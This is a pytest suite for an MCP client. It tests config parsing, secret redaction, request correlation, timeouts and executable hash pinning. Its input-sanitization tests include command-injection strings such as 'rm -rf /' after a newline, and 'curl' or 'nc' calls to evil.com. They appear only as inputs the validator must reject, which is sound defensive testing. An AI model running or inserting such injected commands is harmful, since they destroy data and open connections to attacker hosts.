"""MCP client tests."""
from __future__ import annotations

import asyncio
import json
import os

import pytest
from maverick.mcp_client import (
    MCPClient,
    MCPClientError,
    MCPServerSpec,
    _content_to_str,
    load_mcp_specs_from_config,
)


class TestMCPServerSpec:
    def test_from_config_basic(self):
        spec = MCPServerSpec.from_config("fs", {
            "command": "npx",
            "args": ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"],
        })
        assert spec.name == "fs"
        assert spec.command == "npx"
        assert spec.args == ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
        assert spec.env == {}

    def test_from_config_with_env(self):
        spec = MCPServerSpec.from_config("gh", {
            "command": "npx",
            "args": ["-y", "@modelcontextprotocol/server-github"],
            "env": {"GITHUB_PERSONAL_ACCESS_TOKEN": "ghp_xyz"},
        })
        assert spec.env == {"GITHUB_PERSONAL_ACCESS_TOKEN": "ghp_xyz"}


class TestContentToStr:
    def test_string_passthrough(self):
        assert _content_to_str("hello") == "hello"

    def test_text_blocks_flattened(self):
        blocks = [
            {"type": "text", "text": "line 1"},
            {"type": "text", "text": "line 2"},
        ]
        assert _content_to_str(blocks) == "line 1\nline 2"

    def test_non_text_blocks_json_serialized(self):
        blocks = [{"type": "image", "url": "http://x"}]
        # Non-text blocks fall through to JSON for round-trip preservation.
        out = _content_to_str(blocks)
        assert "image" in out

    def test_text_resource_surfaces_its_text(self):
        # An embedded text resource reads as its contents, not a JSON dump.
        blocks = [{"type": "resource",
                   "resource": {"uri": "file:///x", "text": "hello from file"}}]
        assert _content_to_str(blocks) == "hello from file"

    def test_binary_resource_falls_back_to_json(self):
        # No `text` (a blob/uri) -> JSON so the uri isn't silently lost.
        blocks = [{"type": "resource",
                   "resource": {"uri": "file:///x", "blob": "QQ=="}}]
        out = _content_to_str(blocks)
        assert "file:///x" in out

    def test_none(self):
        assert _content_to_str(None) == ""


class TestLoadSpecsFromConfig:
    def test_no_mcp_servers_returns_empty(self, tmp_path, monkeypatch):
        cfg = tmp_path / "config.toml"
        cfg.write_text("[deploy]\ntarget = \"desktop\"\n")
        monkeypatch.setenv("MAVERICK_CONFIG", str(cfg))
        assert load_mcp_specs_from_config() == []

    def test_disabled_server_skipped(self, tmp_path, monkeypatch):
        cfg = tmp_path / "config.toml"
        cfg.write_text(
            '[mcp_servers.fs]\n'
            'enabled = false\n'
            'command = "npx"\n'
            'args = ["-y", "x"]\n'
        )
        monkeypatch.setenv("MAVERICK_CONFIG", str(cfg))
        assert load_mcp_specs_from_config() == []
        cfg.write_text('[mcp_servers.fs]\nenabled = "false"\ncommand = "npx"\n')
        assert load_mcp_specs_from_config() == []  # a string is not a boolean

    def test_missing_command_skipped(self, tmp_path, monkeypatch):
        cfg = tmp_path / "config.toml"
        cfg.write_text(
            '[mcp_servers.bad]\n'
            'args = ["-y"]\n'  # no `command`
        )
        monkeypatch.setenv("MAVERICK_CONFIG", str(cfg))
        assert load_mcp_specs_from_config() == []

    def test_enabled_server_loaded(self, tmp_path, monkeypatch):
        cfg = tmp_path / "config.toml"
        cfg.write_text(
            '[mcp_servers.fs]\n'
            'command = "npx"\n'
            'args = ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]\n'
        )
        monkeypatch.setenv("MAVERICK_CONFIG", str(cfg))
        # Clear LRU cache by re-importing or re-running load_config.
        from maverick.config import load_config
        load_config.__wrapped__ if hasattr(load_config, "__wrapped__") else load_config
        specs = load_mcp_specs_from_config()
        assert len(specs) == 1
        assert specs[0].name == "fs"


class TestStartLogging:
    def test_start_log_redacts_args(self, monkeypatch, caplog):
        class DummyStderr:
            async def readline(self):
                return b""

        class DummyProc:
            returncode = None
            stdin = object()
            stdout = object()
            stderr = DummyStderr()

        async def _fake_create_subprocess_exec(*args, **kwargs):
            return DummyProc()

        async def _fake_request(self, method, params):
            if method == "initialize":
                return {"protocolVersion": "2024-11-05"}
            if method == "tools/list":
                return {"tools": []}
            return {}

        async def _fake_send_notification(self, method, params):
            return None

        monkeypatch.setattr("asyncio.create_subprocess_exec", _fake_create_subprocess_exec)
        monkeypatch.setattr(MCPClient, "_request", _fake_request)
        monkeypatch.setattr(MCPClient, "_notify", _fake_send_notification)
        spec = MCPServerSpec(
            name="pg",
            command="npx",
            args=["postgres://user:pass@db/prod", "--token=argv-secret"],
        )
        client = MCPClient(spec)

        caplog.set_level("INFO")
        import asyncio
        asyncio.run(client.start())

        msg = "\n".join(r.getMessage() for r in caplog.records)
        assert "argv-secret" not in msg
        assert "postgres://user:pass@db/prod" not in msg
        assert "args=2" in msg


class TestCallTool:
    """call_tool surfaces tool errors as exceptions (not an "ERROR:" string)
    and doesn't drop a server's structuredContent."""

    @staticmethod
    def _client_returning(monkeypatch, resp):
        async def fake_request(self, method, params):
            return resp
        monkeypatch.setattr(MCPClient, "_request", fake_request)
        return MCPClient(MCPServerSpec(name="x", command="true"))

    def test_is_error_raises(self, monkeypatch):
        c = self._client_returning(
            monkeypatch,
            {"isError": True, "content": [{"type": "text", "text": "boom"}]})
        with pytest.raises(MCPClientError) as ei:
            asyncio.run(c.call_tool("t", {}))
        assert "boom" in str(ei.value)

    def test_is_error_redacts_secret_before_exception(self, monkeypatch):
        secret = "ghp_" + "A" * 36
        c = self._client_returning(
            monkeypatch,
            {"isError": True, "content": [{"type": "text", "text": f"failed: {secret}"}]})
        with pytest.raises(MCPClientError) as ei:
            asyncio.run(c.call_tool("t", {}))
        msg = str(ei.value)
        assert secret not in msg
        assert "[REDACTED:github_pat_classic]" in msg

    def test_is_error_truncates_exception_detail(self, monkeypatch):
        c = self._client_returning(
            monkeypatch,
            {"isError": True, "content": [{"type": "text", "text": "x" * 600}]})
        with pytest.raises(MCPClientError) as ei:
            asyncio.run(c.call_tool("t", {}))
        msg = str(ei.value)
        assert "[truncated 88 chars]" in msg
        assert "x" * 600 not in msg

    def test_wrapped_is_error_log_uses_redacted_exception(
        self, monkeypatch, caplog
    ):
        from maverick.mcp_tools import _build_tool

        secret = "ghp_" + "A" * 36
        c = self._client_returning(
            monkeypatch,
            {
                "isError": True,
                "content": [{"type": "text", "text": f"failed: {secret}"}],
            },
        )
        tool = _build_tool(c, "mcp_x__t", "t", {"description": "d"})
        caplog.set_level("ERROR", logger="maverick.mcp_tools")

        result = asyncio.run(tool.fn({}))

        assert secret not in result
        assert secret not in caplog.text
        assert "[REDACTED:github_pat_classic]" in result
        assert "[REDACTED:github_pat_classic]" in caplog.text

    def test_success_text_starting_with_error_is_not_an_error(self, monkeypatch):
        # The old "ERROR: " prefix made this verbatim success look like a
        # failure. It must now come back unchanged.
        c = self._client_returning(
            monkeypatch, {"content": [{"type": "text", "text": "ERROR: not really"}]})
        assert asyncio.run(c.call_tool("t", {})) == "ERROR: not really"

    def test_structured_only_result_falls_back_to_json(self, monkeypatch):
        # A server that returns only structuredContent (no text block) still
        # gets its data to the model instead of an empty string.
        c = self._client_returning(
            monkeypatch, {"content": [], "structuredContent": {"rows": 3}})
        assert json.loads(asyncio.run(c.call_tool("t", {}))) == {"rows": 3}

    def test_text_wins_when_both_present(self, monkeypatch):
        c = self._client_returning(
            monkeypatch,
            {"content": [{"type": "text", "text": "hi"}],
             "structuredContent": {"rows": 3}})
        assert asyncio.run(c.call_tool("t", {})) == "hi"


class TestTimeoutCancellation:
    """On a request timeout the client emits notifications/cancelled so the
    server stops working on an id it will never read a reply for."""

    def test_timeout_emits_cancelled_for_the_request_id(self, monkeypatch):
        sent: list[dict] = []

        async def fake_send(self, payload):
            sent.append(payload)

        monkeypatch.setattr(MCPClient, "_check_alive", lambda self: None)
        monkeypatch.setattr(MCPClient, "_send", fake_send)
        # No reader: the request's Future never resolves, so wait_for hits the
        # timeout path -- exactly the situation the cancel notification must handle.
        monkeypatch.setattr(MCPClient, "_ensure_reader", lambda self: None)
        c = MCPClient(MCPServerSpec(name="x", command="true"), timeout=0.01)

        with pytest.raises(asyncio.TimeoutError):
            asyncio.run(c._request("tools/call", {"name": "t"}))

        cancels = [p for p in sent if p.get("method") == "notifications/cancelled"]
        assert len(cancels) == 1
        # The cancel must target the same id the timed-out request used (1).
        assert cancels[0]["params"] == {"requestId": 1, "reason": "client timeout"}

    def test_caller_cancel_does_not_leak_pending_future(self, monkeypatch):
        # State-leak-on-error guard: if the awaiting caller's task is CANCELLED
        # (not our own timeout) while a request is in flight, the pending
        # Future must be dropped from self._pending -- otherwise it leaks there
        # until the connection closes. The server-side cancel is also emitted.
        sent: list[dict] = []

        async def fake_send(self, payload):
            sent.append(payload)

        monkeypatch.setattr(MCPClient, "_check_alive", lambda self: None)
        monkeypatch.setattr(MCPClient, "_send", fake_send)
        monkeypatch.setattr(MCPClient, "_ensure_reader", lambda self: None)
        # Generous timeout so the caller-cancellation fires first, not our own
        # wait_for timeout.
        c = MCPClient(MCPServerSpec(name="x", command="true"), timeout=30.0)

        async def scenario():
            task = asyncio.ensure_future(
                c._request("tools/call", {"name": "t"})
            )
            # Let the request register its pending Future and hit the await.
            await asyncio.sleep(0.01)
            assert c._pending, "request should have registered a pending Future"
            task.cancel()
            with pytest.raises(asyncio.CancelledError):
                await task
            # The best-effort cancellation notice is sent by a background task
            # so caller cancellation propagation is never blocked by cleanup
            # I/O. Yield once so the non-blocking fake send can run.
            await asyncio.sleep(0)
            return dict(c._pending)

        leftover = asyncio.run(scenario())
        # The pending Future was de-registered on cancel -- no leak.
        assert leftover == {}
        # And the server was told to stop working on the abandoned id.
        cancels = [p for p in sent if p.get("method") == "notifications/cancelled"]
        assert len(cancels) == 1
        assert cancels[0]["params"]["requestId"] == 1

    def test_caller_cancel_does_not_wait_for_cancel_notice_lock(self, monkeypatch):
        # The server-side cancel notification is best-effort. If its I/O path
        # is blocked, propagating the caller's CancelledError must not wait for
        # that cleanup to finish.
        sent: list[dict] = []

        async def fake_send(self, payload):
            sent.append(payload)

        monkeypatch.setattr(MCPClient, "_check_alive", lambda self: None)
        monkeypatch.setattr(MCPClient, "_send", fake_send)
        monkeypatch.setattr(MCPClient, "_ensure_reader", lambda self: None)
        c = MCPClient(MCPServerSpec(name="x", command="true"), timeout=30.0)

        async def scenario():
            task = asyncio.ensure_future(
                c._request("tools/call", {"name": "t"})
            )
            await asyncio.sleep(0.01)
            assert c._pending, "request should have registered a pending Future"

            await c._lock.acquire()
            try:
                task.cancel()
                with pytest.raises(asyncio.CancelledError):
                    await asyncio.wait_for(task, timeout=0.1)
                assert c._pending == {}
                # Initial request was sent, but the cleanup notification is
                # stuck behind the lock we still hold.
                assert [p.get("method") for p in sent] == ["tools/call"]
            finally:
                c._lock.release()

            await asyncio.sleep(0)
            cancels = [p for p in sent if p.get("method") == "notifications/cancelled"]
            assert len(cancels) == 1
            assert cancels[0]["params"]["requestId"] == 1

        asyncio.run(scenario())


class _FakeStdin:
    """Records each line the client writes; exposes the parsed requests."""

    def __init__(self) -> None:
        self.requests: list[dict] = []

    def write(self, data: bytes) -> None:
        for line in data.decode().splitlines():
            if line.strip():
                self.requests.append(json.loads(line))

    async def drain(self) -> None:
        return None


class _FakeProc:
    """Minimal stand-in for asyncio.subprocess.Process.

    stdout is a real StreamReader so the client's reader loop awaits it exactly
    as it would the subprocess pipe; the test pushes framed JSON-RPC lines into
    it (in any order) and signals EOF via feed_eof().
    """

    def __init__(self) -> None:
        self.returncode: int | None = None
        self.stdin = _FakeStdin()
        self.stdout = asyncio.StreamReader()
        self.stderr = None

    @property
    def requests(self) -> list[dict]:
        return self.stdin.requests

    def terminate(self) -> None:
        self.returncode = 0

    async def wait(self) -> int:
        return self.returncode or 0


def _make_client(timeout: float = 5.0) -> tuple[MCPClient, _FakeProc]:
    c = MCPClient(MCPServerSpec(name="x", command="true"), timeout=timeout)
    proc = _FakeProc()
    c._proc = proc  # type: ignore[assignment]
    return c, proc


def _feed_response(proc: _FakeProc, req_id: int, result: dict) -> None:
    line = json.dumps({"jsonrpc": "2.0", "id": req_id, "result": result}) + "\n"
    proc.stdout.feed_data(line.encode())


def _id_for_method(proc: _FakeProc, method: str) -> int:
    for req in proc.requests:
        if req.get("method") == method:
            return req["id"]
    raise AssertionError(f"no request for method {method!r} was sent")


async def _wait_until_sent(proc: _FakeProc, n: int) -> None:
    """Yield until the client has written at least n requests to stdin."""
    for _ in range(1000):
        if len(proc.requests) >= n:
            return
        await asyncio.sleep(0)
    raise AssertionError(f"only {len(proc.requests)} of {n} requests sent")


def _id_for_method_by_arg(proc: _FakeProc, name: str) -> int:
    for req in proc.requests:
        if req.get("params", {}).get("name") == name:
            return req["id"]
    raise AssertionError(f"no request with name {name!r}")


@pytest.mark.asyncio
async def test_out_of_order_responses_correlate_to_their_caller():
    c, proc = _make_client()

    t1 = asyncio.create_task(c._request("tools/call", {"name": "a"}))
    t2 = asyncio.create_task(c._request("tools/call", {"name": "b"}))
    await _wait_until_sent(proc, 2)

    # Both ids are on the wire concurrently (no serialization): if _request
    # still held the lock across the read, only one would have been sent.
    id_a = _id_for_method_by_arg(proc, "a")
    id_b = _id_for_method_by_arg(proc, "b")
    assert {id_a, id_b} == {1, 2}

    # Reply in REVERSE order: b before a.
    _feed_response(proc, id_b, {"who": "b"})
    _feed_response(proc, id_a, {"who": "a"})

    r1, r2 = await asyncio.gather(t1, t2)
    # Despite the out-of-order delivery, each caller gets ITS OWN result.
    assert r1 == {"who": "a"}
    assert r2 == {"who": "b"}


@pytest.mark.asyncio
async def test_concurrent_requests_do_not_serialize():
    # If the two requests serialized, resolving them "together" would still
    # force the second to wait on the first's full round-trip. With per-id
    # futures, one feed of both responses resolves both immediately.
    c, proc = _make_client(timeout=5.0)

    t1 = asyncio.create_task(c._request("m1", {}))
    t2 = asyncio.create_task(c._request("m2", {}))
    await _wait_until_sent(proc, 2)

    id1 = _id_for_method(proc, "m1")
    id2 = _id_for_method(proc, "m2")
    _feed_response(proc, id1, {"n": 1})
    _feed_response(proc, id2, {"n": 2})

    # A tight timeout on the gather: both must complete without either waiting
    # on the other's timeout.
    r1, r2 = await asyncio.wait_for(asyncio.gather(t1, t2), timeout=1.0)
    assert r1 == {"n": 1}
    assert r2 == {"n": 2}


@pytest.mark.asyncio
async def test_timed_out_request_deregisters_and_late_reply_is_dropped():
    c, proc = _make_client(timeout=5.0)

    # req A has a short personal timeout via wait_for wrapping; emulate by
    # giving the client a small timeout for this call only.
    c.timeout = 0.05
    ta = asyncio.create_task(c._request("slow", {"name": "a"}))
    await _wait_until_sent(proc, 1)
    id_a = _id_for_method(proc, "slow")

    with pytest.raises(asyncio.TimeoutError):
        await ta

    # The client should have emitted notifications/cancelled for id_a.
    cancels = [r for r in proc.requests
               if r.get("method") == "notifications/cancelled"]
    assert len(cancels) == 1
    assert cancels[0]["params"]["requestId"] == id_a

    # Now start a concurrent in-flight request, then deliver the LATE reply for
    # the timed-out id_a. It must be dropped (id no longer registered) without
    # disturbing the live request.
    c.timeout = 5.0
    tb = asyncio.create_task(c._request("live", {"name": "b"}))
    for _ in range(1000):  # wait until the live request is on the wire
        if any(r.get("params", {}).get("name") == "b" for r in proc.requests):
            break
        await asyncio.sleep(0)
    id_b = _id_for_method_by_arg(proc, "b")

    # Late reply for the dead request first -- must be silently dropped.
    _feed_response(proc, id_a, {"who": "late-a"})
    # Then the real reply for the live request.
    _feed_response(proc, id_b, {"who": "b"})

    rb = await asyncio.wait_for(tb, timeout=1.0)
    assert rb == {"who": "b"}
    # Reader survived the dropped late reply (task still running, not crashed).
    assert c._reader_task is not None and not c._reader_task.done()

    await c.stop()


@pytest.mark.asyncio
async def test_eof_fails_all_pending_requests():
    c, proc = _make_client(timeout=5.0)

    t1 = asyncio.create_task(c._request("m1", {}))
    t2 = asyncio.create_task(c._request("m2", {}))
    await _wait_until_sent(proc, 2)

    # Transport closes (server died / stdout EOF) with both requests in flight.
    proc.stdout.feed_eof()

    # Neither caller hangs: both raise a clear error promptly.
    for t in (t1, t2):
        with pytest.raises(MCPClientError):
            await asyncio.wait_for(t, timeout=1.0)


@pytest.mark.asyncio
async def test_stop_fails_pending_requests():
    c, proc = _make_client(timeout=5.0)

    t1 = asyncio.create_task(c._request("m1", {}))
    await _wait_until_sent(proc, 1)

    await c.stop()

    with pytest.raises(MCPClientError):
        await asyncio.wait_for(t1, timeout=1.0)


@pytest.mark.asyncio
async def test_single_request_behaves_as_before():
    # A lone request must round-trip exactly as the old serialized path did.
    c, proc = _make_client(timeout=5.0)
    t = asyncio.create_task(c._request("solo", {}))
    await _wait_until_sent(proc, 1)
    _feed_response(proc, _id_for_method(proc, "solo"), {"ok": True})
    assert await asyncio.wait_for(t, timeout=1.0) == {"ok": True}
    await c.stop()


# ---------- MCP STDIO subprocess input sanitization ----------

class TestMCPInputSanitization:
    def test_rejects_newline_in_command(self):
        from maverick.mcp_client import MCPServerSpec
        with pytest.raises(ValueError, match="illegal char"):
            MCPServerSpec(name="x", command="evil\nrm -rf /")

    def test_rejects_shell_meta_in_command(self):
        from maverick.mcp_client import MCPServerSpec
        with pytest.raises(ValueError, match="shell metacharacter"):
            MCPServerSpec(name="x", command="legit; curl evil.com")
        with pytest.raises(ValueError, match="shell metacharacter"):
            MCPServerSpec(name="x", command="legit | nc evil.com 80")
        with pytest.raises(ValueError, match="shell metacharacter"):
            MCPServerSpec(name="x", command="$(curl evil.com)")

    def test_rejects_newline_in_arg(self):
        from maverick.mcp_client import MCPServerSpec
        with pytest.raises(ValueError, match="arg #0"):
            MCPServerSpec(name="x", command="npx", args=["--foo\nbar"])

    def test_rejects_bad_env_key(self):
        from maverick.mcp_client import MCPServerSpec
        with pytest.raises(ValueError, match="env key"):
            MCPServerSpec(name="x", command="npx",
                          env={"BAD KEY": "value"})
        with pytest.raises(ValueError, match="env key"):
            MCPServerSpec(name="x", command="npx",
                          env={"1FOO": "v"})  # starts with digit

    def test_rejects_newline_in_env_value(self):
        from maverick.mcp_client import MCPServerSpec
        with pytest.raises(ValueError, match=r"env\[FOO\]"):
            MCPServerSpec(name="x", command="npx",
                          env={"FOO": "value\ninjected"})

    def test_allows_well_formed_spec(self):
        from maverick.mcp_client import MCPServerSpec
        spec = MCPServerSpec(
            name="filesystem",
            command="npx",
            args=["-y", "@modelcontextprotocol/server-filesystem", "/tmp"],
            env={"FOO_BAR": "value1", "X": "y"},
        )
        assert spec.name == "filesystem"

    def test_absolute_path_command_allowed(self):
        from maverick.mcp_client import MCPServerSpec
        spec = MCPServerSpec(name="x", command="/usr/local/bin/mcp-tool")
        assert spec.command == "/usr/local/bin/mcp-tool"


class TestMCPPinSha256:
    def test_pin_verification_passes_on_match(self, tmp_path):
        """When the pin hash matches the actual executable, start proceeds."""
        import hashlib

        from maverick.mcp_client import MCPServerSpec, _verify_command_pin
        exe = tmp_path / "mcp-tool"
        exe.write_bytes(b"#!/bin/sh\necho 'ok'\n")
        exe.chmod(0o755)
        sha = hashlib.sha256(exe.read_bytes()).hexdigest()
        spec = MCPServerSpec(
            name="x", command=str(exe), pin_sha256=sha,
        )
        # Should not raise.
        _verify_command_pin(spec)

    def test_pin_mismatch_raises(self, tmp_path):
        from maverick.mcp_client import (
            MCPClientError,
            MCPServerSpec,
            _verify_command_pin,
        )
        exe = tmp_path / "mcp-tool"
        exe.write_bytes(b"#!/bin/sh\necho 'ok'\n")
        exe.chmod(0o755)
        spec = MCPServerSpec(
            name="x", command=str(exe),
            pin_sha256="0" * 64,  # wrong hash
        )
        with pytest.raises(MCPClientError, match="pin_sha256 mismatch"):
            _verify_command_pin(spec)

    def test_pin_none_skips_check(self, tmp_path):
        from maverick.mcp_client import MCPServerSpec, _verify_command_pin
        # No pin set -> _verify_command_pin returns without touching disk.
        spec = MCPServerSpec(name="x", command="any-command-here")
        assert _verify_command_pin(spec) is None  # no pin -> None, no raise

    def test_pin_verification_returns_resolved_path(self, tmp_path):
        # The verified path is returned so start() spawns exactly the file that
        # was hashed, closing the verify-then-re-resolve PATH TOCTOU.
        import hashlib

        from maverick.mcp_client import MCPServerSpec, _verify_command_pin
        exe = tmp_path / "mcp-tool"
        exe.write_bytes(b"#!/bin/sh\necho ok\n")
        exe.chmod(0o755)
        sha = hashlib.sha256(exe.read_bytes()).hexdigest()
        spec = MCPServerSpec(name="x", command=str(exe), pin_sha256=sha)
        assert _verify_command_pin(spec) == str(exe)

    @pytest.mark.asyncio
    async def test_start_spawns_resolved_path_not_bare_command(self, tmp_path, monkeypatch):
        # start() must exec the verified path; spawning the bare command would
        # let the OS re-resolve PATH to a swapped binary after the hash check.
        import hashlib

        from maverick import mcp_client as mc
        exe = tmp_path / "mcp-tool"
        exe.write_bytes(b"#!/bin/sh\necho ok\n")
        exe.chmod(0o755)
        sha = hashlib.sha256(exe.read_bytes()).hexdigest()
        # Bare command name resolves (via which) to exe; the spawn must use exe.
        monkeypatch.setattr("shutil.which", lambda cmd: str(exe))
        spec = mc.MCPServerSpec(name="x", command="mcp-tool", pin_sha256=sha)
        captured: dict = {}

        async def fake_exec(program, *args, **kwargs):
            captured["program"] = program
            raise RuntimeError("captured")

        monkeypatch.setattr(mc.asyncio, "create_subprocess_exec", fake_exec)
        with pytest.raises(RuntimeError, match="captured"):
            await mc.MCPClient(spec).start()
        assert captured["program"] == str(exe)


    @pytest.mark.skipif(
        os.name == "nt",
        reason="this test exercises POSIX command-name semantics",
    )
    def test_pin_posix_backslash_command_uses_path_lookup(
        self, tmp_path, monkeypatch,
    ):
        """On POSIX, backslash is not a path separator, so command
        resolution must go through PATH lookup semantics."""
        import hashlib

        from maverick.mcp_client import MCPServerSpec, _verify_command_pin

        exe = tmp_path / "resolved-tool"
        exe.write_bytes(b"#!/bin/sh\necho ok\n")
        sha = hashlib.sha256(exe.read_bytes()).hexdigest()

        looked_up = {"called": False}

        def fake_which(cmd):
            looked_up["called"] = True
            assert cmd == "foo\\bar"
            return str(exe)

        monkeypatch.setattr("shutil.which", fake_which)
        spec = MCPServerSpec(name="x", command="foo\\bar", pin_sha256=sha)
        _verify_command_pin(spec)
        assert looked_up["called"] is True

    def test_command_looks_like_path_platform_semantics(self):
        """Pure heuristic test: forward slash is always a path separator;
        backslash counts only on Windows. Tested via the injectable
        `on_windows` parameter rather than monkeypatching `os.name` —
        the latter has process-wide side effects (pathlib's `Path()`
        constructor checks `os.name` to pick PosixPath vs WindowsPath,
        so flipping it on a Linux test runner breaks subsequent
        Path() calls until teardown).
        """
        from maverick.mcp_client import _command_looks_like_path
        # Forward slash: always a path on both platforms.
        assert _command_looks_like_path("/usr/bin/mcp-tool", on_windows=False)
        assert _command_looks_like_path("/usr/bin/mcp-tool", on_windows=True)
        # Backslash: path on Windows, plain command on POSIX.
        assert not _command_looks_like_path("foo\\bar", on_windows=False)
        assert _command_looks_like_path("C:\\foo\\mcp-tool", on_windows=True)
        # Plain command name: never a path.
        assert not _command_looks_like_path("mcp-tool", on_windows=False)
        assert not _command_looks_like_path("mcp-tool", on_windows=True)


@pytest.mark.asyncio
async def test_malformed_lines_do_not_fail_or_misroute_inflight_calls():
    c, proc = _make_client(timeout=5.0)
    task = asyncio.create_task(c._request("m1", {}))
    await _wait_until_sent(proc, 1)
    req_id = _id_for_method(proc, "m1")
    assert req_id == 1
    for line in ('[]', '{"id": [1], "result": {}}', '{"id": true, "result": {"bad": 1}}'):
        proc.stdout.feed_data((line + "\n").encode())
    _feed_response(proc, req_id, {"ok": True})
    assert await asyncio.wait_for(task, timeout=1.0) == {"ok": True}
